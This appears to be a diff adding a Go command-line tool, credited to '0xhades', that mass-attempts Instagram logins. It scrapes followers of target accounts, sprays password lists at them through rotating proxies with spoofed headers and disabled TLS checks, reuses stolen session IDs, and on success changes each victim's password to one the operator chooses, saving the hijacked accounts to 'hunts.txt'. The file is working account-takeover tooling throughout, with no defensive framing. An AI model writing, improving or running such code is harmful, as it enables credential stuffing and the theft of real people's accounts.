@@ -1,0 +1,1116 @@
+package main
+
+import (
+	"bufio"
+	"context"
+	"crypto/tls"
+	"fmt"
+	"io/ioutil"
+	"math/rand"
+	"net"
+	"os"
+	"runtime"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+
+	"github.com/Pallinder/go-randomdata"
+	"github.com/dlclark/regexp2"
+	"github.com/google/uuid"
+	"github.com/valyala/fasthttp"
+	"github.com/valyala/fasthttp/fasthttpproxy"
+)
+
+type Hunt struct {
+	Account     account
+	username    string
+	password    string
+	sessionID   string
+	uid         string
+	newPassword string
+}
+
+type response struct {
+	ignore     bool
+	username   string
+	password   string
+	body       string
+	sessionID  string
+	uid        string
+	proxy      string
+	statusCode int
+}
+
+var (
+	proxies                     []string
+	passes                      []string
+	users, usernames, passwords []string
+
+	accounts []account
+
+	newGlobalPassword string
+
+	defaultMillisecondsTimeout = 8000
+
+	Threads, rateNum  int
+	sleepBetweenFetch int
+
+	HuntsResponse     uint64
+	IncorrectResponse uint64
+	spamResponse      uint64
+	waitResponse      uint64
+	secureResponse    uint64
+	AllResponse       uint64
+
+	Proxies                        []fasthttp.DialFunc
+	proxyType                      ProxyType = "http"
+	ProxyAuthenticationRequiredNum uint64
+	ProxyErrorsNum                 uint64
+
+	APILoginStatus bool
+	WebLoginStatus bool
+
+	Hunts, Secures []string
+)
+
+type ProxyType string
+
+var (
+	connected    uint64
+	notConnected uint64
+
+	proxyHTTP   ProxyType = "http"
+	proxyHTTPS  ProxyType = "https"
+	proxySocks5 ProxyType = "socks5"
+	activation  bool
+)
+
+func (h *Hunt) changePassword() {
+
+}
+
+func main() {
+
+	runtime.GOMAXPROCS(runtime.NumCPU())
+	//if u find a high CPU usage, comment ^ this line
+
+	var err error
+
+	if runtime.GOOS == "windows" {
+		loadKernelAndProc()
+		defer freeKernelLib()
+	}
+
+	if runtime.GOOS == "windows" {
+		ret, _ := setMaxStdio()
+		if ret == 2048 {
+			printSuccess("Successfully max stdio has changed to 2048", c, r)
+		}
+	}
+
+	clear()
+	logo()
+	Print("Coder: 0xhades", c, r, true)
+	Print("Version: v1", c, r, true)
+	println()
+
+	Choice := ""
+	Print("API Login [A] - Web Login [w] - Both [b]", c, r, true)
+	Choice, err = userInputWithDescription("Default", "Both", "b", c, r, r)
+	check("Error while entering the Choice", err, false, r, c)
+	if simplifyInput(Choice, "a") {
+		APILoginStatus = true
+		WebLoginStatus = false
+	}
+	if simplifyInput(Choice, "w") {
+		APILoginStatus = false
+		WebLoginStatus = true
+	}
+
+retry:
+	newGlobalPassword, err := userInput("New Password", c, r, r)
+	check("Error while entering The New Password", err, false, r, c)
+	if err != nil || newGlobalPassword == "" {
+		goto retry
+	}
+
+	Print("Threads (Lower is better, unless you have a big list of good proxies)", c, r, true)
+	printWithDescription("100", "Low", c, r)
+	printWithDescription("250", "Medium -> Default", c, r)
+	printWithDescription("500", "High", c, r)
+	Threads, err = userInputNum("Enter", 250, c, r, r)
+	check("Error while entering Timeout", err, false, r, c)
+	if err != nil {
+		Threads = 250
+	}
+
+	Print("Timeout in milliseconds for the APIs (depends on your network speed)", c, r, true)
+	printWithDescription("14000", "Slow Speed", c, r)
+	printWithDescription("8000", "Medium Speed", c, r)
+	printWithDescription("5000", "Fast Speed", c, r)
+	defaultMillisecondsTimeout, err = userInputNum("Enter", 8000, c, r, r)
+	check("Error while entering Timeout", err, false, r, c)
+	if err != nil {
+		defaultMillisecondsTimeout = 8000
+	}
+
+	Print("Sleep in milliseconds beetween Each Fetch", c, r, true)
+	printWithDescription("1200", "Default", c, r)
+	sleepBetweenFetch, err = userInputNum("Enter", 1200, c, r, r)
+	check("Error while entering Sleep of Fetch", err, false, r, c)
+	if err != nil {
+		sleepBetweenFetch = 1200
+	}
+
+FetchAllFiles:
+
+	files, err := ioutil.ReadDir("./")
+	if err != nil {
+		errorPrint("Error while fetching all the files in the current folder, Retrying...", r, c)
+		fmt.Scanln()
+		goto FetchAllFiles
+	}
+
+	Print("Finding proxy.txt...", c, r, true)
+	if FileExist("proxy.txt") {
+		proxies, err = getProxies("proxy.txt")
+		if err != nil {
+			proxies = nil
+		}
+		check("Error while loading proxy.txt", err, false, r, c)
+		if err != nil {
+			fmt.Scanln()
+			os.Exit(0)
+		}
+		printSuccess("proxy.txt was loaded successfully", g, c)
+	} else {
+		Print("Didn't find proxy.txt!", c, r, true)
+		fmt.Scanln()
+		os.Exit(0)
+	}
+
+	_proxyType, err := userInputWithDescription("Enter the proxies type", "https, socks5, Skip=http", "http", c, r, r)
+	check("Error while getting proxies type from user's input", err, true, c, r)
+
+	switch _proxyType {
+	case "socks5":
+		proxyType = proxySocks5
+	case "https":
+		proxyType = proxyHTTPS
+	default:
+		proxyType = proxyHTTP
+	}
+
+	Print("Finding list.txt...", c, r, true)
+	if FileExist("list.txt") {
+		users, err = getAccounts("list.txt")
+		if err != nil {
+			users = nil
+		}
+		check("Error while loading list.txt", err, false, r, c)
+		if err != nil {
+			fmt.Scanln()
+			os.Exit(0)
+		}
+		printSuccess("list.txt was loaded successfully", g, c)
+	} else {
+		Print("Didn't find list.txt!", c, r, true)
+		fmt.Scanln()
+		os.Exit(0)
+	}
+
+	for _, f := range files {
+
+		if f.Name() != "list.txt" && f.Name() != "proxy.txt" && f.Name() != "sessions.txt" && f.Name() != "combo.txt" && strings.Contains(strings.ToLower(f.Name()), ".txt") {
+
+			pass, err := getPasswords(f.Name())
+			if err != nil {
+				errorPrint(fmt.Sprintf("Error while Reading %s, Ignorying...", f.Name()), r, c)
+			}
+
+			passes = append(passes, pass...)
+			printSuccess(fmt.Sprintf("%s Added successfully to the passwords", f.Name()), g, c)
+
+		}
+
+	}
+
+	Print("Finding sessions.txt...", c, r, true)
+	if FileExist("sessions.txt") {
+
+		sessionsids, uids, err := getSessions("sessions.txt")
+		check("Error while loading sessions.txt", err, false, r, c)
+
+		if err != nil {
+			accounts = nil
+		} else {
+
+			for i, sessionid := range sessionsids {
+				u, _ := uuid.NewUUID()
+				guid := u.String()
+				device_id := newDeviceID()
+				account := account{
+					sessionID: sessionid,
+					uid:       uids[i],
+					uuid:      guid,
+					device_id: device_id,
+					api:       GetAPI(),
+					loggedIn:  true,
+				}
+				accounts = append(accounts, account)
+			}
+
+			printSuccess("sessions.txt was loaded successfully", g, c)
+
+			choice, err := userInput("Do you want to check all the loaded sessions? (y/n)", c, r, r)
+			check("Error while entering The Choice", err, false, r, c)
+			if YesOrNo(choice) {
+				for _, account := range accounts {
+					if !account.CheckSessionID(proxies[rand.Intn(len(proxies))], defaultMillisecondsTimeout) {
+						account.loggedIn = false
+						errorPrint(fmt.Sprintf("%s is invalied, ignoring it...", account.uid), r, c)
+					} else {
+						printSuccess(fmt.Sprintf("%s is working", account.uid), g, c)
+					}
+				}
+
+				for i, account := range accounts {
+					if !account.loggedIn {
+						accounts = removeFromAccountSlice(accounts, i)
+					}
+				}
+
+			}
+
+		}
+	} else {
+		Print("didn't find sessions.txt, ignoring...", c, r, true)
+	}
+
+	if len(accounts) > 0 {
+		choice, err := userInput("Do you want to add the combo beside the loaded sessions? (y/n)", c, r, r)
+		check("Error while entering The Choice", err, false, r, c)
+		if YesOrNo(choice) {
+			goto comboloader
+		} else {
+			goto skipcombo
+		}
+	}
+
+comboloader:
+
+	Print("Finding combo.txt...", c, r, true)
+	if !FileExist("combo.txt") {
+		errorPrint("didn't find combo.txt", r, c)
+		if len(accounts) > 0 {
+			goto skipcombo
+		}
+		os.Exit(0)
+	}
+	Print("Loading combo.txt...", c, r, true)
+	usernames, passwords, err = getCombo("combo.txt")
+	check("Error while loading combo.txt", err, true, r, c)
+	printSuccess("combo.txt was loaded successfully", g, c)
+
+skipcombo:
+
+	if len(usernames) > 0 && len(passwords) > 0 {
+
+		Print("Logging in all the combo accounts...", c, r, true)
+
+		for i, user := range usernames {
+			if account, ok := newAccount(user, passwords[i], proxies[rand.Intn(len(proxies))], defaultMillisecondsTimeout); ok {
+				printSuccess(fmt.Sprintf("%s logged in successfully", user), g, c)
+				accounts = append(accounts, *account)
+			} else {
+				errorPrint(fmt.Sprintf("%s cannot login it, removing it...", user), r, c)
+			}
+		}
+
+		choice, err := userInput("Do you want to save all the sessions for later? (y/n)", c, r, r)
+		check("Error while entering The Choice", err, false, r, c)
+		if YesOrNo(choice) {
+
+			for {
+				err := saveSessions()
+				check("Error while saving the sessions", err, false, r, c)
+				if err != nil {
+					choice, err := userInput("Try again? (y/n)", c, r, r)
+					check("Error while entering The Choice", err, false, r, c)
+					if !YesOrNo(choice) {
+						break
+					}
+				} else {
+					break
+				}
+			}
+
+		}
+
+	}
+
+	if len(passes) == 0 {
+		errorPrint("There is no passwords!", r, c)
+		fmt.Scanln()
+		os.Exit(0)
+	}
+
+	if len(proxies) == 0 {
+		errorPrint("There is no proxies!", r, c)
+		fmt.Scanln()
+		os.Exit(0)
+	}
+
+	if len(users) == 0 {
+		errorPrint("There is no usernames!", r, c)
+		fmt.Scanln()
+		os.Exit(0)
+	}
+
+	users = uniqueStringList(users)
+	passes = uniqueStringList(passes)
+
+	printSuccessWithDescription("Usernames' List Count after removing duplicates", fmt.Sprintf("%d", len(users)), g, c)
+	printSuccessWithDescription("Passwords' List Count after removing duplicates", fmt.Sprintf("%d", len(passes)), g, c)
+
+	Proxies = make([]fasthttp.DialFunc, len(proxies))
+
+	var completed uint64
+
+	switch proxyType {
+	case proxySocks5:
+		for i := 0; i < len(proxies); i++ {
+			go func(i int) {
+				ctx, cancel := context.WithTimeout(context.Background(), time.Second*30)
+				dialer := fasthttpproxy.FasthttpSocksDialerWithCtx(proxies[i], ctx)
+				Proxies[i] = func(addr string) (net.Conn, error) {
+					defer cancel()
+					return dialer(addr)
+				}
+				atomic.AddUint64(&completed, 1)
+			}(i)
+		}
+	default:
+		for i := 0; i < len(proxies); i++ {
+			go func(i int) {
+				Proxies[i] = fasthttpproxy.FasthttpHTTPDialer(proxies[i], time.Second*30)
+				atomic.AddUint64(&completed, 1)
+			}(i)
+		}
+	}
+
+	for {
+		time.Sleep(time.Millisecond)
+		printDelete("Allocating Proxies "+fmt.Sprintf("%v", completed)+"/"+fmt.Sprintf("%v", (len(proxies)))+" ...", c, r)
+		if int(completed) >= len(proxies) {
+			break
+		}
+	}
+
+	printDelete("Allocating Proxies "+fmt.Sprintf("%v", completed)+"/"+fmt.Sprintf("%v", (len(proxies)))+" ...", c, r)
+	println()
+	printSuccess(fmt.Sprintf("%d", len(Proxies))+" Proxies have Allocated successfully", c, r)
+
+	runtime.GC()
+
+	//users = append(users, "selenescow")
+
+	go superVisior()
+	go rate()
+
+	var wgg sync.WaitGroup
+	wgg.Add(len(users))
+
+	for _, user := range users {
+
+		go func() {
+
+			for {
+
+			retrying:
+				followers, err := getNewFollowers(&accounts[rand.Intn(len(accounts))], user)
+				if err != nil {
+					goto retrying
+				}
+
+				var wp sync.WaitGroup
+				wp.Add(len(passes))
+
+				for _, pass := range passes {
+
+					userIndex := 0
+					proxyIndex := 0
+					for {
+
+						if userIndex >= len(followers) {
+							break
+						}
+
+						if proxyIndex >= len(proxies) {
+							proxyIndex = 0
+						}
+
+						// var wg sync.WaitGroup
+						// wg.Add(Threads)
+
+						responsesChannel := make(chan response, Threads)
+
+						for j := userIndex; j < Threads+userIndex; j++ {
+							// without random? uncomment this:
+							// if proxyIndex >= len(proxies) {
+							// 	proxyIndex = 0
+							// }
+							go loginCheck(j, proxyIndex, pass, followers, responsesChannel, nil) //&wg)
+							proxyIndex++
+						}
+
+						//wg.Wait()
+
+						//go handleResponses(...) [go] == socket error
+						//too fast = too many open connections (fd)s
+						handleResponses(responsesChannel, Threads)
+
+						//wg.Wait()
+
+						userIndex += Threads
+
+					}
+
+					time.Sleep(time.Millisecond * time.Duration(sleepBetweenFetch))
+
+					wp.Done()
+
+				}
+
+				wp.Wait()
+
+			}
+
+			wgg.Done()
+
+		}()
+
+	}
+
+	wgg.Wait()
+
+	Print("Finished Running", c, r, false)
+	stdoutReader.Scan()
+}
+
+func ProcessSecure(res response) {
+
+	statusSuccessPrint("New Secure", fmt.Sprintf("%s:%s", res.username, res.password), c, r)
+
+	Secures = append(Secures, fmt.Sprintf("%s:%s", res.username, res.password))
+	writeLines(Secures, "secures.txt")
+
+}
+
+func ProcessHunt(res response) {
+
+	u, _ := uuid.NewUUID()
+	guid := u.String()
+
+	Account := account{
+		device_id: newDeviceID(),
+		username:  res.username,
+		password:  res.password,
+		sessionID: res.sessionID,
+		uid:       res.uid,
+		uuid:      guid,
+		loggedIn:  true,
+		api:       GetAPI(),
+	}
+
+	if Account.changePassword(newGlobalPassword, res.proxy, defaultMillisecondsTimeout) {
+		Hunts = append(Hunts, fmt.Sprintf("%s:%s:%s", res.sessionID, res.username, newGlobalPassword))
+		statusSuccessPrint("New Hunt", fmt.Sprintf("%s:%s", res.username, newGlobalPassword), c, r)
+	} else {
+		Hunts = append(Hunts, fmt.Sprintf("%s:%s:%s", res.sessionID, res.username, res.password))
+		statusSuccessPrint("New Hunt", fmt.Sprintf("%s:%s", res.username, res.password), c, r)
+	}
+
+	writeLines(Hunts, "hunts.txt")
+
+	// Hunts = append(Hunts, fmt.Sprintf(`
+
+	// +-------------------------------------+
+	// 	username: %s
+	// 	SessionID: %s
+	// 	ID: %s
+	// 	password: %s
+	//	proxy: %s
+	// 	date: %s
+	// +-------------------------------------+
+
+	// `, res.username, res.sessionID, res.uid, res.password, res.proxy, time.Now().Format("2006-01-02 15:04:05 PM Monday")))
+
+}
+
+func handleResponses(responsesChannel chan response, loops int) {
+
+	var wait sync.WaitGroup
+	var i int
+
+	for res := range responsesChannel {
+
+		i++
+
+		if res.body != "" && !res.ignore {
+
+			//appendToFile("log.txt", fmt.Sprintln("\n%s\n", res.body))
+
+			wait.Add(1)
+			go func() {
+
+				body := strings.ToLower(res.body)
+				if strings.Contains(body, "logged_in_user") || strings.Contains(body, "\"authenticated\":true") || strings.Contains(body, "\"authenticated\": true") {
+
+					atomic.AddUint64(&HuntsResponse, 1)
+					go ProcessHunt(res)
+
+				} else if strings.Contains(body, "sentry_block") || strings.Contains(body, "ip_block") || strings.Contains(body, "spam") || strings.Contains(body, "<title>site blocked</title>") {
+
+					atomic.AddUint64(&spamResponse, 1)
+
+				} else if strings.Contains(body, "secure") || strings.Contains(body, "unusable_password") ||
+					strings.Contains(body, "checkpoint_challenge_required") || strings.Contains(body, "challenge_required") {
+
+					atomic.AddUint64(&secureResponse, 1)
+					go ProcessSecure(res)
+
+				} else if strings.Contains(body, "wait") {
+
+					atomic.AddUint64(&waitResponse, 1)
+
+				} else if strings.Contains(body, "incorrect") || strings.Contains(body, "password") || strings.Contains(body, "\"authenticated\":false") || strings.Contains(body, "\"authenticated\": false") {
+					atomic.AddUint64(&IncorrectResponse, 1)
+				}
+
+				atomic.AddUint64(&AllResponse, 1)
+				wait.Done()
+
+			}()
+
+		}
+
+		if i == loops {
+			break
+		}
+
+	}
+
+	wait.Wait()
+
+}
+
+func APILogin(us, ps, prx string, p fasthttp.DialFunc, r chan response) {
+
+retry:
+
+	if p == nil {
+		p = Proxies[rand.Intn(len(Proxies))]
+		goto retry
+	}
+
+	api := GetAPI()
+	u, _ := uuid.NewUUID()
+	guid := u.String()
+	device_id := newDeviceID()
+
+	data := fmt.Sprintf("phone_id=%s&device_id=%s&_csrftoken=missing&csrftoken=missing&username=%s&password=%s&guid=%s&login_attempt_count=0", guid, device_id, us, ps, guid)
+
+	req := fasthttp.AcquireRequest()
+	req.SetRequestURI("https://i.instagram.com/api/v1/accounts/login/")
+	req.Header.Set("Host", "i.instagram.com")
+	req.Header.Set("User-Agent", api.USERAGENT)
+	req.Header.Set("Accept", "*/*")
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+	req.Header.SetMethod("POST")
+	req.SetBodyString(data)
+	req.SetConnectionClose()
+
+	Client := &fasthttp.Client{
+		MaxConnsPerHost:           64,
+		MaxIdemponentCallAttempts: 1,
+		ReadTimeout:               30 * time.Second,
+		WriteTimeout:              30 * time.Second,
+		TLSConfig:                 &tls.Config{InsecureSkipVerify: true},
+		Dial:                      p,
+		DialDualStack:             true,
+		NoDefaultUserAgentHeader:  false,
+	}
+
+	resp := fasthttp.AcquireResponse()
+	defer fasthttp.ReleaseRequest(req)
+	defer fasthttp.ReleaseResponse(resp)
+
+	if err := Client.DoTimeout(req, resp, time.Duration(defaultMillisecondsTimeout)*time.Millisecond); err == nil {
+
+		var sessionID, uid string
+
+		if Cookie := resp.Header.PeekCookie("sessionid"); Cookie != nil {
+			sessionID = string(Cookie)
+		}
+
+		if Cookie := resp.Header.PeekCookie("ds_user_id"); Cookie != nil {
+			uid = string(Cookie)
+		}
+
+		r <- response{
+			proxy:      prx,
+			username:   us,
+			password:   ps,
+			body:       string(resp.Body()),
+			sessionID:  sessionID,
+			uid:        uid,
+			statusCode: resp.StatusCode(),
+		}
+
+	} else {
+		if strings.Contains(err.Error(), "407") {
+			atomic.AddUint64(&ProxyAuthenticationRequiredNum, 1)
+		}
+		atomic.AddUint64(&ProxyErrorsNum, 1)
+		p = Proxies[rand.Intn(len(Proxies))]
+		goto retry
+	}
+
+}
+
+func WebLogin(us, ps, prx string, p fasthttp.DialFunc, r chan response) {
+
+retry:
+
+	if p == nil {
+		p = Proxies[rand.Intn(len(Proxies))]
+		goto retry
+	}
+
+	now := time.Now()
+	data := fmt.Sprintf("username=%v&enc_password=#PWD_INSTAGRAM_BROWSER:0:%v:%v", us, now.Unix(), ps)
+
+	req := fasthttp.AcquireRequest()
+	req.SetRequestURI("https://www.instagram.com/accounts/login/ajax/")
+	req.Header.Set("Host", "www.instagram.com")
+	req.Header.Set("User-Agent", randomdata.UserAgentString())
+	req.Header.Set("X-IG-WWW-Claim", "hmac.AR0gbMXlxalK1rnxdtE9GBbOFaQVz8vCfl7E4EgrVs7T_Uih")
+	req.Header.Set("X-ASBD-ID", "437806")
+	req.Header.Set("X-IG-App-ID", "936619743392459")
+	req.Header.Set("X-Instagram-AJAX", "caee87137ae9")
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("X-CSRFToken", randomdata.RandStringRunes(15))
+	req.Header.Set("X-Instagram-AJAX", "1")
+	req.Header.Set("x-requested-with", "XMLHttpRequest")
+	req.Header.Set("Accept", "*/*")
+	req.Header.SetMethod("POST")
+	req.SetBodyString(data)
+	req.SetConnectionClose()
+
+	Client := &fasthttp.Client{
+		MaxConnsPerHost:           64,
+		MaxIdemponentCallAttempts: 1,
+		ReadTimeout:               30 * time.Second,
+		WriteTimeout:              30 * time.Second,
+		TLSConfig:                 &tls.Config{InsecureSkipVerify: true},
+		Dial:                      p,
+		DialDualStack:             true,
+		NoDefaultUserAgentHeader:  false,
+	}
+
+	resp := fasthttp.AcquireResponse()
+	defer fasthttp.ReleaseRequest(req)
+	defer fasthttp.ReleaseResponse(resp)
+
+	if err := Client.DoTimeout(req, resp, time.Duration(defaultMillisecondsTimeout)*time.Millisecond); err == nil {
+
+		var sessionID, uid string
+
+		if Cookie := resp.Header.PeekCookie("sessionid"); Cookie != nil {
+			sessionID = string(Cookie)
+		}
+
+		if Cookie := resp.Header.PeekCookie("ds_user_id"); Cookie != nil {
+			uid = string(Cookie)
+		}
+
+		r <- response{
+			proxy:      prx,
+			username:   us,
+			password:   ps,
+			body:       string(resp.Body()),
+			sessionID:  sessionID,
+			uid:        uid,
+			statusCode: resp.StatusCode(),
+		}
+
+	} else {
+		if strings.Contains(err.Error(), "407") {
+			atomic.AddUint64(&ProxyAuthenticationRequiredNum, 1)
+		}
+		atomic.AddUint64(&ProxyErrorsNum, 1)
+		p = Proxies[rand.Intn(len(Proxies))]
+		goto retry
+	}
+
+}
+
+func loginCheck(userIndex, proxyIndex int, password string, Usernames []string, r chan response, wg *sync.WaitGroup) {
+
+	var username, prx string
+	var proxy fasthttp.DialFunc
+	if wg != nil {
+		defer wg.Done()
+	}
+
+	if userIndex >= len(Usernames) || userIndex < 0 {
+		r <- response{
+			ignore: true,
+		}
+		return
+	}
+
+	username = Usernames[userIndex]
+	if proxyIndex >= len(proxies) || proxyIndex < 0 {
+		randomIndex := rand.Intn(len(Proxies))
+		proxy = Proxies[randomIndex]
+		prx = proxies[randomIndex]
+	} else {
+		proxy = Proxies[proxyIndex]
+		prx = proxies[proxyIndex]
+	}
+
+	if WebLoginStatus && !APILoginStatus {
+		WebLogin(username, password, prx, proxy, r)
+		return
+	}
+
+	if !WebLoginStatus && APILoginStatus {
+		APILogin(username, password, prx, proxy, r)
+		return
+	}
+
+	if randomdata.Boolean() {
+		WebLogin(username, password, prx, proxy, r)
+		return
+	}
+
+	APILogin(username, password, prx, proxy, r)
+
+}
+
+func getNewFollowers(a *account, us string) ([]string, error) {
+
+	proxy := proxies[rand.Intn(len(proxies))]
+
+	ID, err := a.IDByUsername(us, proxy, defaultMillisecondsTimeout)
+	if err != nil {
+		return nil, err
+	}
+
+	usernames, _, _, _ := a.followers(ID, "", proxy, defaultMillisecondsTimeout)
+	return usernames, nil
+
+}
+
+func getProxies(filename string) ([]string, error) {
+
+	var proxies []string
+	var lines []string
+	content, err := ioutil.ReadFile(filename)
+	if err != nil {
+		return nil, err
+	}
+
+	lines = strings.Split(string(content), "\n")
+
+	for _, line := range lines {
+
+		rawProxy := strings.Join(strings.Fields(line), "")
+		rawProxy = strings.Replace(rawProxy, "\n", "", -1)
+		rawProxy = strings.Replace(rawProxy, "\r", "", -1)
+		rawProxy = strings.Replace(rawProxy, "\r\n", "", -1)
+		rawProxy = strings.Replace(rawProxy, "\n\r", "", -1)
+		rawProxy = strings.Replace(rawProxy, " ", "", -1)
+
+		if strings.Contains(rawProxy, ":") && strings.Contains(rawProxy, ".") &&
+			!strings.Contains(rawProxy, " ") && rawProxy != "." {
+			proxies = append(proxies, rawProxy)
+		}
+
+	}
+
+	return proxies, nil
+
+}
+
+func getAccounts(filename string) ([]string, error) {
+
+	var list []string
+
+	content, err := ioutil.ReadFile(filename)
+	if err != nil {
+		return nil, err
+	}
+
+	lines := strings.Split(string(content), "\n")
+
+	for _, line := range lines {
+
+		raw := strings.Join(strings.Fields(line), "")
+		raw = strings.Replace(raw, "\n", "", -1)
+		raw = strings.Replace(raw, "\r", "", -1)
+		raw = strings.Replace(raw, "\r\n", "", -1)
+		raw = strings.Replace(raw, "\n\r", "", -1)
+		raw = strings.Replace(raw, " ", "", -1)
+		list = append(list, strings.ToLower(raw))
+	}
+
+	return list, nil
+
+}
+
+func FileExist(path string) bool {
+
+	_, err := os.Open(path)
+	if err != nil {
+		return false
+	}
+	return true
+
+}
+
+func getPasswords(filename string) ([]string, error) {
+
+	var list []string
+
+	content, err := ioutil.ReadFile(filename)
+	if err != nil {
+		return nil, err
+	}
+
+	lines := strings.Split(string(content), "\n")
+
+	for _, line := range lines {
+
+		raw := strings.Replace(line, "\n", "", -1)
+		raw = strings.Replace(raw, "\r", "", -1)
+		raw = strings.Replace(raw, "\r\n", "", -1)
+		raw = strings.Replace(raw, "\n\r", "", -1)
+		raw = strings.Replace(raw, " ", "", -1)
+		raw = strings.Join(strings.Fields(raw), "")
+		list = append(list, strings.ToLower(raw))
+	}
+
+	return list, nil
+
+}
+
+func uniqueStringList(intSlice []string) []string {
+	keys := make(map[string]bool)
+	list := []string{}
+	for _, entry := range intSlice {
+		if _, value := keys[entry]; !value {
+			keys[entry] = true
+			list = append(list, entry)
+		}
+	}
+	return list
+}
+
+func superVisior() {
+
+	clear()
+	logo()
+	printSuccess("Started Running...", c, r)
+
+	for {
+
+		setConsoleTitle(fmt.Sprintf("All: %d, Incorrect: %d, Sec: %d, Valid: %d, Errors: %d, ProxErr: %d, R/S: %d", AllResponse, IncorrectResponse, secureResponse, len(Hunts), spamResponse+waitResponse, ProxyErrorsNum, rateNum))
+		time.Sleep(time.Millisecond * 250)
+
+	}
+
+}
+
+func rate() {
+	for {
+		rateNum1 := AllResponse
+		time.Sleep(time.Second)
+		rateNum = int(AllResponse - rateNum1)
+		runtime.GC()
+	}
+}
+
+func writeLines(lines []string, path string) error {
+	file, err := os.Create(path)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	w := bufio.NewWriter(file)
+	for _, line := range lines {
+		_, _ = fmt.Fprintln(w, line)
+	}
+	return w.Flush()
+}
+
+func extractRegex2(pattern string, text string, lengthLimit int) []string {
+	re := regexp2.MustCompile(pattern, regexp2.None)
+
+	var matches []string
+	m, _ := re.FindStringMatch(text)
+	for m != nil {
+		result := m.GroupByNumber(1).String()
+		if lengthLimit != 0 {
+			if len(result) <= lengthLimit {
+				matches = append(matches, result)
+			}
+		} else {
+			matches = append(matches, result)
+		}
+		m, _ = re.FindNextMatch(m)
+	}
+	return matches
+
+}
+func suInt64(i uint64) string {
+	return fmt.Sprintf("%d", i)
+}
+
+func sInt(i int) string {
+	return fmt.Sprintf("%d", i)
+}
+func appendToFile(filename string, data string) error {
+	f, err := os.OpenFile(filename,
+		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	if _, err := f.WriteString(data); err != nil {
+		return err
+	}
+	return nil
+}
+
+func getSessions(filename string) ([]string, []string, error) {
+
+	/*sessionid:uid*/
+
+	var sessionids []string
+	var uids []string
+
+	content, err := ioutil.ReadFile(filename)
+	if err != nil {
+		return nil, nil, err
+	}
+
+	lines := strings.Split(string(content), "\n")
+
+	for _, line := range lines {
+
+		raw := strings.Join(strings.Fields(line), "")
+		raw = strings.Replace(raw, "\n", "", -1)
+		raw = strings.Replace(raw, "\r", "", -1)
+		raw = strings.Replace(raw, "\r\n", "", -1)
+		raw = strings.Replace(raw, "\n\r", "", -1)
+		raw = strings.Replace(raw, " ", "", -1)
+
+		combo := strings.SplitN(raw, ":", 2)
+
+		if len(combo) != 2 && len(combo) != 1 {
+			continue
+		}
+
+		if len(combo) == 1 {
+			_combo := strings.Split(raw, "%3A")
+			sessionids = append(sessionids, combo[0])
+			uids = append(uids, _combo[0])
+		}
+
+		if len(combo) == 2 {
+			sessionids = append(sessionids, combo[0])
+			uids = append(uids, combo[1])
+		}
+
+	}
+
+	return sessionids, uids, nil
+
+}
+
+func removeFromAccountSlice(slice []account, index int) []account {
+	return append(slice[:index], slice[index+1:]...)
+}
+
+func getCombo(filename string) ([]string, []string, error) {
+
+	var list []string
+	var password []string
+
+	content, err := ioutil.ReadFile(filename)
+	if err != nil {
+		return nil, nil, err
+	}
+
+	lines := strings.Split(string(content), "\n")
+
+	for _, line := range lines {
+
+		raw := strings.Join(strings.Fields(line), "")
+		raw = strings.Replace(raw, "\n", "", -1)
+		raw = strings.Replace(raw, "\r", "", -1)
+		raw = strings.Replace(raw, "\r\n", "", -1)
+		raw = strings.Replace(raw, "\n\r", "", -1)
+		raw = strings.Replace(raw, " ", "", -1)
+
+		//combo := strings.SplitN(raw, ":", 2)
+		combo := strings.Split(raw, ":")
+
+		if len(combo) < 2 {
+			continue
+		}
+
+		list = append(list, strings.ToLower(combo[0]))
+		password = append(password, combo[1])
+	}
+
+	return list, password, nil
+
+}
+
+func saveSessions() error {
+
+	/*sessionid:uid*/
+
+	var sessions []string
+
+	for _, account := range accounts {
+		sessions = append(sessions, fmt.Sprintf("%s:%s", account.sessionID, account.uid))
+	}
+
+	if FileExist("sessions.txt") {
+		if err := deleteFile("sessions.txt"); err != nil {
+			return err
+		}
+	}
+
+	if err := writeLines(sessions, "sessions.txt"); err != nil {
+		return err
+	}
+
+	return nil
+
+}
+
+func deleteFile(filename string) error {
+	err := os.Remove(filename)
+	if err != nil {
+		return err
+	}
+	return nil
+}
